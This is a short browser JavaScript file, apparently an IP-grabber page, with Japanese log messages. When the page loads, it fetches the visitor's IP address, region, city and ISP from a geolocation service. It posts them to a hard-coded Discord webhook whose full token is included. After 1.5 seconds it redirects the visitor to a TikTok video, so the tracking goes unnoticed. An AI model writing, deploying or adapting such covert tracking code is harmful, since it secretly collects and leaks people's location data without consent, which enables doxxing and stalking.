const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; 
const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";

async function track() {
    console.log("=== 追跡開始 ===");
    try {
        const response = await fetch('https://ipwho.is/');
        const data = await response.json();
        
        if (data.success) {
            console.log("IP取得成功:", data.ip);
            
            if (WEBHOOK_URL) {
                console.log("Discordへ送信を試行中...");
                const discordRes = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **アクセス検出成功**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}\nISP: ${data.connection.isp}`
                    })
                });
                
                if (discordRes.ok) {
                    console.log("Discordへの送信に成功しました！");
                } else {
                    console.error("Discordへの送信に失敗しました。ステータス:", discordRes.status);
                }
            }
        }
    } catch (e) {
        console.error("エラーが発生しました:", e);
    }

    console.log("1.5秒後にリダイレクトします...");
    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 1500);
}

track();
